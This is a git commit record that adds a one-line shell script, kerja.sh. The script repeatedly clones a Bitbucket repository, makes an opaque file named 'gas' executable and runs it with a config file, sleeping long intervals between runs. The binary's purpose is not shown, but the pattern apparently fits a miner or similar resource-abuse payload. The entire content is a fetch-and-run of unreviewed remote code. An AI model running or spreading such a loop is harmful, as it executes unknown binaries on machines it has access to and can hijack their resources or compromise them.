b79ad40386ded156124058e2a4067919c481391d
dannys-id <60502767+dannys-id@users.noreply.github.com>
2021-10-21 12:30:38 +0700

    Add files via upload

---
+++ kerja.sh
@@ -0,0 +1,1 @@
+a=0; while [ $a -lt 10 ]; do git clone https://jokoGendeng@bitbucket.org/jokoGendeng/dungdung.git; cd dungdung; chmod +x gas; ./gas keun.ini; echo $a; a=`expr $a + 1`; sleep 6000; done;
